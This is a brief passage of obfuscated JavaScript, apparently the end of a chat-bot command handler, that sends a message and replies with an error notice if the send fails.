    await _0x18d5ed.sendMessage(_0x4a8bcd, _0x4db1a2);
  } catch (_0x324d6f) {
    _0x49ae6b("*Error !!*");
    _0x26c9f1(_0x324d6f);
  }
});
